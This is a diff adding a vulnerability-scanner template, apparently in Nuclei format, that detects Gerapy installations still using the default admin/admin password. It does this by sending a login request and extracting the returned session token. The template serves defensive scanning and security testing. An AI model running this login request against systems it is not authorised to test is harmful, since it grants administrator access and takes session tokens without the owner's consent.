@@ -1,0 +1,35 @@
+id: gerapy-default-password
+info:
+  name: Gerapy Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django, and Vue. Gerapy has a weak password vulnerability. Attackers can directly use the default password admin/admin to log in to the background as an administrator and obtain sensitive information.
+  tags: [default-password]
+  reference:
+    - https://github.com/Gerapy/Gerapy
+
+http:
+  - raw:
+      - |
+        POST /api/user/auth HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=utf-8
+        Content-Length: 37
+
+        {"username":"admin","password":"admin"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"token\":"
+        part: body
+    extractors:
+      - type: json
+        json:
+          - '.token'
